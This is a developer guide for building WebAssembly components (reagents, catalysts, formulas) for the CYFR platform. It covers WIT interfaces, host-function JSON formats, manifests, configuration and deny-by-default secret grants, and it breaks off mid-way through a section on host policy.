# Component Guide

A practical guide for developers building WASM components for CYFR.

> **Authoritative Spec**: For the complete component specification, validation rules, and error catalog, see the Locus service documentation.

---

## What is a CYFR Component?

A CYFR component is a WebAssembly module that exports a specific interface defined by CYFR. Components are:

- **Portable**: Run anywhere CYFR runs (cloud, edge, local)
- **Sandboxed**: Execute in isolated environments with capability-based security
- **Composable**: Combine components to build complex workflows
- **Language-agnostic**: Build with any language that compiles to WASM

CYFR uses the [WebAssembly Component Model](https://component-model.bytecodealliance.org/) to define interfaces between components and the host runtime. The Opus runtime targets **WASI Preview 2** — all components should be built with `wasm32-wasip2` and use the Component Model binary format.

---

## Before You Start

### What You'll Need

**To use CYFR (run components, manage secrets/policy):**

| Tool | Install |
|------|---------|
| `cyfr` CLI | `brew install cyfr` |

**To build WASM components (pick your language):**

| Tool | Install |
|------|---------|
| Rust + `cargo-component` | `rustup target add wasm32-wasip2` + `cargo install cargo-component` |
| TinyGo (optional) | `brew install tinygo` |
| `wasm-tools` | `cargo install wasm-tools` |

### Quick Start

```bash
# Install and initialize
brew install cyfr
cyfr init                     # Scaffolds components/, data/, wit/
cyfr up                       # Starts the CYFR server

# Authenticate (if multi-user)
cyfr login
cyfr whoami
```

### Project Layout

After `cyfr init`, your project has:

```
your-project/
├── wit/             # Canonical WIT definitions — copy into your component
│   ├── reagent/     #   Pure compute interface
│   ├── catalyst/    #   I/O interface (HTTP, secrets)
│   └── formula/     #   Composition interface (invoke, MCP)
├── components/      # Your WASM components live here
│   ├── catalysts/
│   ├── reagents/
│   └── formulas/
└── data/
    └── cyfr.db      # Secrets, policies, execution records (.gitignored)
```

- **`wit/`** — Copy the relevant subdirectory into your component's `src/wit/` folder. Always copy, never symlink.
- **`components/`** — Layout: `components/{type}s/{namespace}/{name}/{version}/{type}.wasm`
- **`data/`** — All runtime state. Always `.gitignored`.

### CLI ↔ MCP

Every `cyfr` CLI command maps to an MCP tool call. AI agents use the same interface programmatically.

| CLI Command | MCP Tool | Actions |
|---|---|---|
| `cyfr run` | `execution` | `run`, `list`, `logs`, `cancel` |
| `cyfr secret` | `secret` | `set`, `get`, `delete`, `list`, `grant`, `revoke` |
| `cyfr policy` | `policy` | `get`, `set`, `update_field`, `delete`, `list` |
| `cyfr search/inspect/pull/publish/register` | `component` | `search`, `inspect`, `pull`, `publish`, `register` |
| `cyfr audit` | `audit` | `list`, `export`, `show`, `executions` |
| `cyfr login/logout/whoami` | `session` | `login`, `logout`, `whoami` |

---

## The Three Component Types

Choose the right component type for your use case:

### Capabilities Matrix

| Capability | Reagent | Catalyst | Formula |
|------------|---------|----------|---------|
| Pure compute | Yes | Yes | Yes |
| HTTP (`cyfr:http/fetch`) | No | Yes | No |
| Streaming HTTP (`cyfr:http/streaming`) | No | Yes | No |
| Secrets (`cyfr:secrets/read`) | No | Yes | No |
| Invoke sub-components (`cyfr:formula/invoke`) | No | No | Yes |
| Call MCP tools (`cyfr:mcp/tools`) | No | No | Yes (optional) |
| Requires Host Policy | No | **Yes** (`allowed_domains`) | **If using MCP** (`mcp.allowed_tools`) |
| Deterministic | Yes | No | Depends on sub-components |

### Reagent

**Purpose**: Pure computation with no side effects.

```
Input -> [Reagent] -> Output
```

**Use when**:
- Transforming data (JSON processing, format conversion)
- Running calculations (math, statistics, scoring)
- Validating or parsing structured data
- Any deterministic operation

**Constraints**:
- No imports allowed (fully isolated)
- Same input always produces same output
- No network, filesystem, or clock access

**Interface**: `cyfr:reagent/compute`

### Catalyst

**Purpose**: Operations requiring external I/O.

```
Input -> [Catalyst] -> (I/O) -> Output
```

**Use when**:
- Calling external APIs
- Reading/writing external data
- Time-sensitive operations
- Non-deterministic operations

**Constraints**:
- Must declare required capabilities
- User must have permission for declared capabilities
- I/O is audited and rate-limited
- HTTP via `cyfr:http/fetch` host function (not `wasi:http/outgoing-handler`)
- **Requires Host Policy with `allowed_domains`** before execution (see [Configuration](#configuration))

**Interface**: `cyfr:catalyst/run`

**Imports**: `cyfr:http/fetch`, `cyfr:http/streaming`, `cyfr:secrets/read`

### Formula

**Purpose**: Composing multiple components into workflows.

```
Input -> [Formula] -> calls cyfr:formula/invoke -> [Sub-Component] -> ...
              |                                          |
         internal logic (loops, conditionals)        returns result
              |
           Output
```

**Use when**:
- Chaining multiple components
- Building multi-step pipelines
- Creating reusable workflows
- Conditional component routing

**Constraints**:
- Cannot perform I/O directly (no HTTP, no secrets)
- Invokes sub-components via `cyfr:formula/invoke` host function
- All orchestration logic lives inside the WASM binary (loops, conditionals, branching)
- Opus intercepts each `invoke` call, executes the referenced component, and returns the result

**Interface**: `cyfr:formula/run`

**Imports**: `cyfr:formula/invoke@0.1.0`

---

## WIT Interfaces

CYFR defines a canonical WIT package at `wit/` in the project root. Component authors copy the appropriate directory into their project as their `wit/` folder.

### Setup

```bash
# Building a reagent? Copy:
cp -r wit/reagent/ my-project/wit/

# Building a catalyst? Copy:
cp -r wit/catalyst/ my-project/wit/

# Building a formula? Copy:
cp -r wit/formula/ my-project/wit/
```

Components **copy** WIT deps (not symlink). Components must be self-contained for CI, Docker, and registry distribution.

### String-Based JSON Convention

All CYFR interfaces use `string -> string` with JSON-encoded payloads. This maximizes language compatibility — every language with a JSON library can build CYFR components without needing complex WIT record bindings.

### Reagent WIT

`wit/reagent/world.wit` — self-contained, no deps:

```wit
package cyfr:reagent@0.1.0;

interface compute {
    /// Execute a pure computation with JSON input, returning JSON output.
    /// No side effects, no I/O, fully deterministic.
    compute: func(input: string) -> string;
}

world reagent {
    export compute;
}
```

### Catalyst WIT

`wit/catalyst/world.wit`:

```wit
package cyfr:catalyst@0.1.0;

interface run {
    /// Execute the catalyst with JSON input, returning JSON output.
    run: func(input: string) -> string;
}

world catalyst {
    export run;
    import cyfr:http/fetch@0.1.0;
    import cyfr:http/streaming@0.1.0;
    import cyfr:secrets/read@0.1.0;
}
```

Catalysts also include deps under `wit/catalyst/deps/`:

**`deps/cyfr-secrets/read.wit`**:

```wit
package cyfr:secrets@0.1.0;

interface read {
    /// Retrieve a secret by name.
    /// Returns ok(value) on success, or err("access-denied: {name}") if
    /// the secret is not granted to this component.
    get: func(name: string) -> result<string, string>;
}
```

**`deps/cyfr-http/interfaces.wit`**:

```wit
package cyfr:http@0.1.0;

/// Synchronous HTTP request/response
interface fetch {
    request: func(json-request: string) -> string;
}

/// Polling-based streaming HTTP
interface streaming {
    request: func(json-request: string) -> string;
    read: func(handle: string) -> string;
    close: func(handle: string) -> string;
}
```

### Formula WIT

`wit/formula/world.wit` — includes optional MCP access:

```wit
package cyfr:formula@0.1.0;

interface run {
    /// Execute formula orchestration logic with JSON input, returning JSON output.
    run: func(input: string) -> string;
}

/// Host function for invoking sub-components from a Formula.
interface invoke {
    /// Invoke a sub-component. Request and response are JSON-encoded strings.
    /// Request: {"reference": {...}, "input": {...}, "type": "reagent|catalyst|formula"}
    /// Response: {"status": "completed", "output": {...}} or {"error": {...}}
    call: func(json-request: string) -> string;
}

world formula {
    export run;
    import invoke;
    import cyfr:mcp/tools@0.1.0;  // Optional: for dynamic MCP access
}
```

### MCP Access WIT (Optional Formula Import)

Formulas can optionally import `cyfr:mcp/tools` to call MCP tools at runtime. This enables dynamic workflows where the Formula discovers components, generates new ones, or interacts with storage.

`wit/formula/deps/cyfr-mcp/mcp.wit`:

```wit
package cyfr:mcp@0.1.0;

interface tools {
    /// Invoke an MCP tool. Deny-by-default.
    /// Request: {"tool": "component", "action": "search", "params": {...}}
    /// Response: {"result": {...}} or {"error": {...}}
    call: func(json-request: string) -> string;
}
```

**Request Format**:

```json
{
  "tool": "component",
  "action": "search",
  "params": {
    "query": "sentiment analysis",
    "type": "reagent"
  }
}
```

**Success Response**:

```json
{
  "result": {
    "components": [
      {"reference": {"registry": "sentiment:1.0"}, "description": "..."}
    ]
  }
}
```

**Error Response**:

```json
{
  "error": {
    "type": "access-denied",
    "message": "Tool 'secret.get' not in mcp.allowed_tools"
  }
}
```

#### MCP Error Types

| Error Type | Cause |
|------------|-------|
| `access-denied` | Tool not in `mcp.allowed_tools` |
| `invalid_tool` | Unknown tool name |
| `invalid_action` | Unknown action for the tool |
| `invalid_params` | Invalid parameters for the action |
| `tool_error` | Underlying tool execution failed |

> **Host Policy Required**: Formulas using `cyfr:mcp/tools` MUST have Host Policy defining `mcp.allowed_tools`. **Deny-by-default**: unlisted tools are blocked.
```

---

## Component References

When executing or invoking a component, you pass a **reference** that tells Opus how to locate the WASM binary. There are five reference types:

| Type | JSON Format | Resolves To | Use Case |
|------|-------------|-------------|----------|
| `draft` | `{"draft": "draft_abc123def456"}` | In-memory DraftStore | Testing before publish |
| `registry` | `{"registry": "my-api:0.1.0"}` | Compendium local registry | Registered and published components |
| `local` | `{"local": "components/.../catalyst.wasm"}` | Filesystem path | Development/debugging |
| `arca` | `{"arca": "artifacts/my-tool.wasm"}` | Arca user storage | Personal artifacts |
| `oci` | `{"oci": "registry.io/org/name:v1"}` | OCI registry | Remote registry (not yet implemented) |

### Usage in Execution

Direct execution via `Opus.Executor.run/4`:

```elixir
# Execute a draft
Opus.Executor.run(ctx, %{"draft" => "draft_a1b2c3d4e5f6g7h8"}, input)

# Execute from local registry
Opus.Executor.run(ctx, %{"registry" => "my-api:0.1.0"}, input, type: :catalyst)

# Execute a local file
Opus.Executor.run(ctx, %{"local" => "components/reagents/local/my-tool/0.1.0/reagent.wasm"}, input)
```

### Usage in Formula Invoke

When a Formula calls `cyfr:formula/invoke.call()`, the reference is embedded in the JSON request:

```json
{
  "reference": {"registry": "my-api:0.1.0"},
  "input": {"operation": "models.list", "params": {}},
  "type": "catalyst"
}
```

> **Note**: The `type` field defaults to `"reagent"` if omitted. Always specify `"type": "catalyst"` or `"type": "formula"` explicitly when invoking non-reagent components.

### Component Ref (Derived Identity)

Every execution requires a **component ref** — a short string that uniquely identifies the component for policy enforcement, secret grants, rate limiting, and audit logging. The component ref is derived automatically from the WASM file's path in the canonical directory layout:

```
components/{type}s/{namespace}/{name}/{version}/{type}.wasm
                 └──────────┘ └────┘ └───────┘
                      │          │       │
                      └──────────┴───────┴──→  {namespace}.{name}:{version}
```

**Examples:**

| Path | Component Ref |
|------|---------------|
| `components/catalysts/local/gemini/0.1.0/catalyst.wasm` | `local.gemini:0.1.0` |
| `components/catalysts/cyfr/stripe/1.0.0/catalyst.wasm` | `cyfr.stripe:1.0.0` |
| `components/reagents/local/parser/0.1.0/reagent.wasm` | `local.parser:0.1.0` |
| `components/formulas/agent/gen-abc/0.1.0/formula.wasm` | `agent.gen-abc:0.1.0` |

**The canonical layout is required.** If a WASM file is not in the canonical directory structure, execution will fail with a clear error message explaining the expected layout. There is no fallback — this ensures every component has a deterministic, unique identity for security isolation.

**Why this matters:**

- **Policy isolation**: Each component ref gets its own `allowed_domains`, `rate_limit`, and `timeout` via `Sanctum.PolicyStore.put(component_ref, policy)`
- **Secret grants**: Secrets are granted per component ref — `Sanctum.Secrets.grant(ctx, "API_KEY", "local.gemini:0.1.0")` only grants to that specific component
- **Rate limiting**: Rate limits are tracked per `{user_id, component_ref}` pair
- **Audit trail**: Every execution record includes the component ref for forensic analysis

**For tests:** Test setups must create the canonical directory structure in temp dirs. For example:

```elixir
# Correct: creates canonical layout so component ref can be derived
wasm_dir = Path.join(test_path, "catalysts/local/gemini/0.1.0")
File.mkdir_p!(wasm_dir)
wasm_path = Path.join(wasm_dir, "catalyst.wasm")
File.cp!(@wasm_source, wasm_path)
# => component ref: "local.gemini:0.1.0"
```

---

## Host Function JSON Formats

### `cyfr:http/fetch` — `request(json-request: string) -> string`

#### Basic Request

```json
{
  "method": "GET",
  "url": "https://api.example.com/data",
  "headers": {"Authorization": "Bearer ..."},
  "body": ""
}
```

#### POST with JSON Body

```json
{
  "method": "POST",
  "url": "https://api.openai.com/v1/chat/completions",
  "headers": {
    "Authorization": "Bearer sk-...",
    "Content-Type": "application/json"
  },
  "body": "{\"model\":\"gpt-4o\",\"messages\":[{\"role\":\"user\",\"content\":\"Hello\"}]}"
}
```

Note: The `body` field is always a **string**. For JSON payloads, serialize the JSON object to a string first.

#### Extended Options

**Base64 body encoding** (for sending binary data):

```json
{
  "method": "POST",
  "url": "...",
  "headers": {...},
  "body": "<base64 encoded data>",
  "body_encoding": "base64"
}
```

**Base64 response encoding** (for receiving binary data):

```json
{
  "method": "GET",
  "url": "...",
  "headers": {...},
  "response_encoding": "base64"
}
```

Response with base64 encoding:

```json
{"status": 200, "headers": {...}, "body": "<base64>", "body_encoding": "base64"}
```

**Multipart/form-data** (for file uploads):

```json
{
  "method": "POST",
  "url": "https://api.openai.com/v1/audio/transcriptions",
  "headers": {"Authorization": "Bearer ..."},
  "multipart": [
    {"name": "file", "filename": "audio.mp3", "content_type": "audio/mpeg", "data": "<base64>"},
    {"name": "model", "value": "whisper-1"}
  ]
}
```

Each multipart part has:
- `name` (required): Field name
- `value` (string): For text fields
- `data` (string): Base64-encoded binary for file fields
- `filename` (string): Original filename
- `content_type` (string): MIME type

#### Success Response

```json
{"status": 200, "headers": {"content-type": "application/json"}, "body": "{...}"}
```

#### Error Response

```json
{"error": {"type": "domain_blocked", "message": "example.com not in allowed_domains"}}
```

#### Error Types

| Error Type | Cause |
|------------|-------|
| `domain_blocked` | URL hostname not in policy `allowed_domains` |
| `method_blocked` | HTTP method not in policy `allowed_methods` |
| `private_ip_blocked` | DNS resolved to private/reserved IP (SSRF prevention) |
| `rate_limited` | Too many requests in time window |
| `request_too_large` | Request body exceeds policy `max_request_size` |
| `response_too_large` | Response body exceeds policy `max_response_size` |
| `dns_error` | DNS resolution failed for hostname |
| `timeout` | Request exceeded 30s timeout |
| `http_error` | Network or HTTP-level failure |

### `cyfr:http/streaming` — Polling-Based Streaming HTTP

For consuming streaming responses (e.g., Server-Sent Events from OpenAI).

#### Protocol Flow

```
1. WASM calls streaming.request(json)  ->  host returns {"handle": "abc123"}
2. WASM calls streaming.read("abc123") ->  host returns {"data": "chunk...", "done": false}
   ... (loop until done) ...
3. WASM calls streaming.read("abc123") ->  host returns {"data": "", "done": true}
4. WASM calls streaming.close("abc123") -> host returns {"ok": true}
```

#### Request

Same format as `cyfr:http/fetch`:

```json
{"method": "POST", "url": "https://api.openai.com/v1/chat/completions", "headers": {...}, "body": "..."}
```

Response:

```json
{"handle": "abc123"}
```

#### Read (loop until done)

```json
// In-progress chunk:
{"data": "data: {\"choices\":[...]}\n\n", "done": false}

// Final chunk (stream complete):
{"data": "", "done": true}
```

#### Close

```json
{"ok": true}
```

#### Streaming Error Response

```json
{"error": {"type": "stream_limit", "message": "Maximum concurrent streams (3) exceeded"}}
```

#### Streaming Error Types

| Error Type | Cause |
|------------|-------|
| `stream_limit` | Exceeded max 3 concurrent streams per execution |
| `timeout` | Stream exceeded 60s timeout |
| `invalid_handle` | Unknown or already-closed stream handle |
| `response_too_large` | Cumulative streamed data exceeds policy `max_response_size` |

All `cyfr:http/fetch` error types (domain_blocked, method_blocked, etc.) also apply to `streaming.request`.

#### Constraints

- Max **3 concurrent streams** per execution
- **60s timeout** per stream (auto-closed after timeout)
- Cumulative response size tracked against policy `max_response_size`
- All streams auto-cleaned when execution completes

### `cyfr:secrets/read` — `get(name: string) -> result<string, string>`

Returns `ok(value)` on success, or `err("access-denied: {name}")` if the secret is not granted to this component.

### `cyfr:formula/invoke` — `call(json-request: string) -> string`

#### Request

```json
{
  "reference": {"registry": "sentiment_analyzer:3.5"},
  "input": {"texts": ["great product", "terrible service"]},
  "type": "reagent"
}
```

The `reference` field accepts any of the five [Component References](#component-references). The `type` field defaults to `"reagent"` if omitted.

#### Success Response

```json
{"status": "completed", "output": {"score": 0.85}}
```

#### Error Response

```json
{"error": {"type": "execution_failed", "message": "Component panicked during execution"}}
```

#### Invoke Error Types

| Error Type | Cause |
|------------|-------|
| `invalid_json` | Request string is not valid JSON |
| `invalid_request` | Missing `reference` (map) or `input` (map) |
| `invalid_type` | `type` field is not `reagent`, `catalyst`, or `formula` |
| `execution_failed` | Sub-component execution failed (timeout, panic, policy violation, etc.) |

---

## Component Directory Structure

All components — user-developed, first-party, agent-generated, and Compendium-downloaded — follow the same canonical layout:

```
components/
+-- catalysts/
|   +-- cyfr/                            # Verified publisher (pulled from registry)
|   |   +-- stripe/
|   |       +-- 1.0.0/
|   |           +-- src/                 # Source code (Cargo.toml, lib.rs, wit/)
|   |           +-- catalyst.wasm        # Built binary (always named by type)
|   |           +-- cyfr-manifest.json   # Component manifest (required)
|   |           +-- config.json          # Developer-defined default config
|   |           +-- README.md            # Human-readable docs (recommended)
|   +-- local/                           # Human dev created (Cursor, Claude Code, etc.)
|   |   +-- my-tool/
|   |       +-- 0.1.0/
|   |           +-- src/
|   |           +-- catalyst.wasm
|   |           +-- cyfr-manifest.json
|   +-- agent/                           # Brain Formula generated (via build.compile)
|       +-- gen-abc123/
|           +-- 0.1.0/
|               +-- catalyst.wasm
|               +-- cyfr-manifest.json
+-- reagents/
|   +-- cyfr/
|   |   +-- json-transform/
|   |       +-- 1.0.0/
|   |           +-- src/
|   |           +-- reagent.wasm
|   |           +-- cyfr-manifest.json
|   |           +-- config.json
|   |           +-- README.md
|   +-- local/
|   |   +-- my-reagent/
|   |       +-- 0.1.0/
|   |           +-- src/
|   |           +-- reagent.wasm
|   |           +-- cyfr-manifest.json
|   +-- agent/
|       +-- gen-xyz789/
|           +-- 0.1.0/
|               +-- reagent.wasm
|               +-- cyfr-manifest.json
+-- formulas/
    +-- cyfr/
    |   +-- webhook-processor/
    |       +-- 1.0.0/
    |           +-- src/
    |           +-- formula.wasm
    |           +-- cyfr-manifest.json
    |           +-- config.json
    |           +-- README.md
    +-- local/
    |   +-- my-workflow/
    |       +-- 0.1.0/
    |           +-- formula.wasm
    |           +-- cyfr-manifest.json
    +-- agent/
        +-- gen-brain-flow/
            +-- 0.1.0/
                +-- formula.wasm
                +-- cyfr-manifest.json
```

### Namespace Access Model

| Namespace | Created By | Brain Formula Access | Human Dev Access |
|-----------|------------|---------------------|------------------|
| `cyfr/` | Compendium (registry pull) | Search + Pull + Run | Search + Pull + Run |
| `local/` | Human devs (Cursor, Claude Code) | Read + Run only | Read + Write + Run |
| `agent/` | Brain Formula via `build.compile` | **Read + Write + Run** | Read + Run |

> **Agent namespace**: Brain Formulas can only write to `agent/`. This provides a clear trust boundary — agent-generated code is isolated from human-developed and registry-pulled components.

**Key conventions:**

- **Binary named by type**, not by component name: `catalyst.wasm`, `reagent.wasm`, `formula.wasm`
- **Manifest required**: Every component must include `cyfr-manifest.json` (see [Component Manifest](#component-manifest-cyfr-manifestjson))
- **Versions are semver folders**: `1.0.0/`, not `v1.0.0/`
- **Source code** lives in `src/` within each version folder
- **README recommended**: `README.md` alongside the binary for human-readable documentation
- **Same layout** for user-developed, first-party, and Compendium-downloaded components
- **No separate cache layer**: `cyfr pull` places components directly in `components/`. Delete and re-pull if needed.

**Registry references map to local paths:**

| Registry Reference | Local Path |
|---|---|
| `cyfr.run/catalysts/stripe:1.0` | `components/catalysts/cyfr/stripe/1.0.0/catalyst.wasm` |
| `cyfr.run/reagents/json-transform:1.0` | `components/reagents/cyfr/json-transform/1.0.0/reagent.wasm` |
| `cyfr.run/formulas/webhook-processor:1.0` | `components/formulas/cyfr/webhook-processor/1.0.0/formula.wasm` |

**Project-local data:**

All structured data (secrets, policy, logs, API keys, sessions) lives in `data/cyfr.db`. The `data/` directory should be `.gitignored` as it contains encrypted secrets and session tokens.

```
project-root/
+-- components/           # WASM components (by type/publisher/name/version)
+-- data/
|   +-- cyfr.db           # All structured data (SQLite)
+-- ...
```

---

## Component Manifest (`cyfr-manifest.json`)

Every component must include a `cyfr-manifest.json` file alongside its WASM binary. The manifest is a machine-readable description of what the component **is** and **needs** — it is distinct from:

- **`config.json`**: Metadata documenting developer-recommended defaults (see [Configuration](#configuration))
- **Host Policy**: Enforcement rules (rate limits, allowed domains) set by the consumer, not the developer

The manifest travels with the component through the entire lifecycle: local development, draft testing, publishing, and pull.

> **Authoritative source**: The Compendium service documentation defines the manifest format for OCI packaging. This section covers the developer-facing usage.

### Field Reference

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `id` | string | Yes | Reverse-DNS identifier (e.g., `cyfr.run.catalysts.stripe`) |
| `type` | enum | Yes | `catalyst`, `reagent`, or `formula` |
| `version` | semver | Yes | Semantic version (e.g., `1.0.0`) |
| `description` | string | Yes | Short human-readable description |
| `license` | string | No | SPDX identifier (e.g., `MIT`, `Apache-2.0`) |
| `source` | enum | No | `include` (source shipped), `external` (link to repo), or `none` |
| `wasi` | object | Yes (catalyst) | WASI capability declarations (see below) |
| `secrets` | string[] | No | Secret names the component expects at runtime |
| `schema.input` | JSON Schema | Recommended | Expected input format |
| `schema.output` | JSON Schema | Recommended | Output format |
| `schema.config` | JSON Schema | No | Valid keys for `config.json` and component config overrides (stored in database) |
| `defaults` | object | No | Vendor-recommended config values |
| `examples` | array | No | Sample input/output pairs for consumers |

**`examples` format:**

```json
"examples": [
  {
    "name": "Create a charge",
    "description": "Charges a customer's default payment method",
    "input": { "action": "charge", "amount": 5000, "customer_id": "cus_123" },
    "output": { "success": true, "transaction_id": "txn_456" }
  }
]
```

Each entry has:
- `name` (string, required) — short label
- `description` (string, optional) — context for the example
- `input` (object, required) — sample input payload
- `output` (object, required) — expected output payload

**`wasi` capabilities:**

| Key | Type | Meaning |
|-----|------|---------|
| `http` | bool | Outbound HTTP via `cyfr:http/fetch` |
| `streaming` | bool | Streaming HTTP via `cyfr:http/streaming` |
| `secrets` | bool | Secret access via `cyfr:secrets/read` |
| `logging` | bool | Structured logging |
| `clocks` | bool | Wall-clock / monotonic time |
| `filesystem` | string[] | Filesystem access modes (e.g., `["read"]`) |

### Examples

**Reagent** (minimal — pure compute, no I/O):

```json
{
  "id": "com.example.data-processor",
  "type": "reagent",
  "version": "1.2.0",
  "description": "Transforms and validates structured data",
  "license": "MIT",
  "schema": {
    "input": { "type": "object" },
    "output": { "type": "object" }
  }
}
```

Reagents have no `wasi` or `secrets` fields — they are fully isolated with no imports.

**Catalyst** (full — I/O capabilities, secrets, schemas):

```json
{
  "id": "cyfr.run.catalysts.stripe",
  "type": "catalyst",
  "version": "1.0.0",
  "description": "Stripe payment processing bridge",
  "wasi": {
    "http": true,
    "secrets": true,
    "logging": true,
    "clocks": true
  },
  "secrets": ["STRIPE_API_KEY"],
  "schema": {
    "input": {
      "type": "object",
      "properties": {
        "action": { "enum": ["charge", "refund", "list"] },
        "amount": { "type": "integer" },
        "customer_id": { "type": "string" }
      }
    },
    "output": {
      "type": "object",
      "properties": {
        "success": { "type": "boolean" },
        "transaction_id": { "type": "string" }
      }
    },
    "config": {
      "type": "object",
      "properties": {
        "max_charge_amount": { "type": "integer" },
        "default_currency": { "type": "string" }
      }
    }
  },
  "defaults": {
    "max_charge_amount": 100000,
    "default_currency": "usd"
  },
  "examples": [
    {
      "name": "Create a charge",
      "description": "Charges a customer's default payment method",
      "input": { "action": "charge", "amount": 5000, "customer_id": "cus_123" },
      "output": { "success": true, "transaction_id": "txn_456" }
    },
    {
      "name": "List charges",
      "input": { "action": "list", "customer_id": "cus_123" },
      "output": { "success": true, "charges": [] }
    }
  ]
}
```

The `secrets` array tells consumers which secrets to grant before running. The `schema.config` block documents valid keys for `config.json` and user-configurable overrides. The `defaults` block provides vendor-recommended values.

**Formula** (mid — composition via host function):

```json
{
  "id": "com.example.crypto-bot",
  "type": "formula",
  "version": "1.0.0",
  "description": "Orchestrates sentiment analysis and trading execution",
  "license": "MIT",
  "schema": {
    "input": {
      "type": "object",
      "properties": {
        "symbol": { "type": "string" },
        "strategy": { "type": "string" }
      }
    },
    "output": {
      "type": "object",
      "properties": {
        "action": { "type": "string" },
        "reason": { "type": "string" }
      }
    }
  }
}
```

Formulas have no `wasi` or `secrets` — they invoke sub-components via `cyfr:formula/invoke`, and each sub-component runs in its own sandbox. Sub-component references are encoded in the WASM binary, not the manifest.

> **See also**: [Compendium docs](docs/services/compendium.md#component-manifest) for OCI packaging details, [Locus docs](docs/services/locus.md) for capability validation at import time.

---

## Configuration

Component configuration uses two JSON files alongside the binary. These files serve as **metadata and documentation** — they communicate the developer's intended defaults and the user's project-specific overrides.

| Source | Purpose | Who Creates It | Storage |
|--------|---------|----------------|---------|
| `config.json` | Developer-recommended defaults | Component developer | Immutable, in component directory |
| Component config overrides | User/project-specific overrides | User/project team | Mutable, in `data/cyfr.db` → `component_configs` table |

**Current behavior**: `config.json` exists as an **immutable artifact alongside the binary** in the component version directory. User overrides are stored in SQLite (`data/cyfr.db` → `component_configs` table) to keep the component directory immutable for signature integrity and OCI distribution. There is no WIT interface or host function that injects config into the WASM binary at runtime. Components that need configurable values should:

1. **Accept them as part of the `input` JSON** — the caller passes config values in the request
2. **Read them via `cyfr:secrets/read`** — for sensitive values (API keys, tokens)
3. **Hardcode sensible defaults in source code** — this is the recommended pattern for catalysts

The manifest `defaults` block documents vendor-recommended values for human and tooling reference. The `schema.config` block documents valid configuration keys.

> **Config vs Host Policy**: Configuration is developer-facing documentation. Host Policy (`allowed_domains`, `rate_limit`, `trusted_signers`) is enforced by Opus at the WASI boundary — the component never sees it.

### Example: API Catalyst Config

**`cyfr-manifest.json`** (relevant section for an API catalyst):

```json
{
  "defaults": {
    "base_url": "https://api.example.com",
    "api_version": "v1",
    "default_model": "default",
    "default_temperature": 1.0,
    "max_retries": 0
  }
}
```

In a catalyst's source code, values like these would typically be hardcoded (e.g., `const BASE_URL: &str = "https://api.example.com/v1/models"`). The manifest `defaults` block documents what those hardcoded values are so consumers and tooling can reference them.

**`config.json`** (ships with the component — documents operational defaults):

```json
{
  "base_url": "https://api.example.com",
  "api_version": "v1",
  "default_model": "default"
}
```

**User overrides** (project-specific, managed via `cyfr config set`):

```bash
# Set overrides (stored in data/cyfr.db → component_configs)
cyfr config set my-catalyst:1.0.0 default_model fast
cyfr config set my-catalyst:1.0.0 max_retries 3
```

---

## Working with Secrets

Secrets (API keys, tokens, credentials) live in Sanctum, encrypted at rest with AES-256-GCM. Components never read secrets from files — they receive them at runtime through a WASI host function, gated by explicit grants.

### Grant Model

Access is deny-by-default. A component can only read a secret if the user has explicitly granted that component access:

```
User stores secret              User grants access                  Runtime resolves
------------------             ------------------                  ----------------
cyfr secret set               cyfr secret grant                   Opus preloads
  API_KEY=sk-live-...    ->      stripe-catalyst:1.0 API_KEY  ->    granted secrets into
                                                                   host-side in-memory map
                                                                   served via closure
```

Each secret can be granted to multiple components, and each component can access multiple secrets. Grants are stored alongside the encrypted secret in `data/cyfr.db`.

Decrypted values live in host (Elixir) process memory — they are never embedded in WASM memory. The WASM component retrieves them on-demand via `get()`, and each `get()` is a simple map lookup with no I/O.

### CLI Workflow

All secret operations require sudo (Policy Lock):

```bash
# Store a secret (encrypted at rest)
cyfr secret set API_KEY=sk-live-abc123

# Grant a catalyst access to the secret
cyfr secret grant stripe-catalyst:1.0 API_KEY

# Revoke access
cyfr secret revoke stripe-catalyst:1.0 API_KEY

# List all stored secrets
cyfr secret list

# Delete a secret entirely
cyfr secret delete API_KEY
```

### MCP Actions for Secrets

AI agents and programmatic clients manage secrets via MCP tool calls:

```json
// Store a secret
{"action": "set", "name": "API_KEY", "value": "sk-live-abc123"}
→ {"stored": true, "name": "API_KEY"}

// List secret names (values never exposed)
{"action": "list"}
→ {"secrets": ["API_KEY", "STRIPE_KEY"], "count": 2}

// Grant a component access
{"action": "grant", "name": "API_KEY", "component": "my-api:0.1.0"}
→ {"granted": true, "secret": "API_KEY", "component": "my-api:0.1.0"}

// Revoke access
{"action": "revoke", "name": "API_KEY", "component": "my-api:0.1.0"}
→ {"status": "revoked", "secret": "API_KEY", "component": "my-api:0.1.0"}

// Check if a component can access a secret
{"action": "can_access", "name": "API_KEY", "component_ref": "my-api:0.1.0"}
→ {"allowed": true}

// Delete a secret entirely (removes all grants)
{"action": "delete", "name": "API_KEY"}
→ {"deleted": true, "name": "API_KEY"}
```

Note: `set`, `delete`, `grant`, and `revoke` require sudo credentials in production.

### How Secrets Work at Runtime

When a catalyst executes, CYFR:

1. Resolves all granted secrets for that component **once** before execution starts
2. Injects them into the WASM host function as an in-memory map
3. Each `get("SECRET_NAME")` call inside the component is a fast map lookup — no disk I/O
4. After execution, all secret values are scrubbed from the output (SecretMasker)

This means:
- Secrets never touch the WASM memory — they stay in the host process
- `get()` is safe to call in loops (it's just a map lookup)
- A catalyst needs **both** a secret grant AND `allowed_domains` policy to function — grants control what data it can read, domains control where it can send data

### Accessing Secrets in a Catalyst (Rust)

Your catalyst imports the `cyfr:secrets/read` interface and calls `get()` with the secret name:

```rust
// In your catalyst's lib.rs
wit_bindgen::generate!({
    world: "catalyst",
    exports: {
        "cyfr:catalyst/run": MyCatalyst,
    },
});

use cyfr::secrets::read;

struct MyCatalyst;

impl Guest for MyCatalyst {
    fn run(input: String) -> String {
        // Retrieve a granted secret at runtime
        let api_key = match read::get("API_KEY") {
            Ok(key) => key,
            Err(e) => return serde_json::json!({"error": e}).to_string(),
        };

        // Use it in an HTTP request (also a host function)
        // cyfr:http/fetch.request takes a JSON string and returns a JSON string
        let req = serde_json::json!({
            "method": "GET",
            "url": "https://api.stripe.com/v1/charges",
            "headers": {"Authorization": format!("Bearer {}", api_key)},
            "body": ""
        });
        let response_json = cyfr::http::fetch::request(&req.to_string());
        // Response: {"status": 200, "headers": {...}, "body": "..."}
        // Error:    {"error": {"type": "domain_blocked", "message": "..."}}

        response_json
    }
}
```

### Catalyst Prerequisite: Host Policy

Before a catalyst can execute, it **must** have a Host Policy with `allowed_domains` set via Sanctum. Without this, Opus rejects execution with a `POLICY_REQUIRED` error. Reagents and Formulas do not require policy.

```bash
# Set allowed domains for a catalyst
